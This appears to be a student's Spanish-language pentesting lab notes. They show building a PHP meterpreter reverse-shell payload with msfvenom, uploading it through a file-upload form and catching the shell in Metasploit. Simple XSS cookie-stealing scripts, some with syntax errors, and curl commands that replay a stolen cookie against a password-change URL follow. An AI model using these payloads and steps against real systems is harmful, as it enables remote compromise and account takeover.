# metasploit
abrir un tunel entre el equipo atacante y la maquina objetivo
kali>Explotationstools>frameworksexploids>password

msfvenom -h
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp

ipatacante -> **
ipobjetivo->**

set LHOST atacante 

en terminal nuevo
msfvenom -l payloads | grep php
msfvenom -p php/meterpreter/reverse_tcp --list-options

msfvenom -p php/meterpreter/reverse_tcp LHOST=atacente LPORT=4444 -o  llamada.php
abrir el archivo que se crea y descomentarlo 



subir el archivo en FileUpload
pegar la ruta del archivo, enter

metaexploit -> exploit 

shell
pwd

----
<script>alert(document.cookie)</script>
### CSRF
URL 

XSS reflected
<script>alert(Objetc.fromEntries(cookie.map({name,value} => [name.value])));</script>

<script>Object.fromEntries(document.cookie.split('; ').forEach(c => alert(c)))</script>

--capturar la cookie con el tamper
curl -h

curl --cookie "cookie"  --location "URLdecambiode contraseña" 

curl --cookie "cookie"  --location "URLdecambiode contraseña"  | grep "Password changed" | tree exito.txt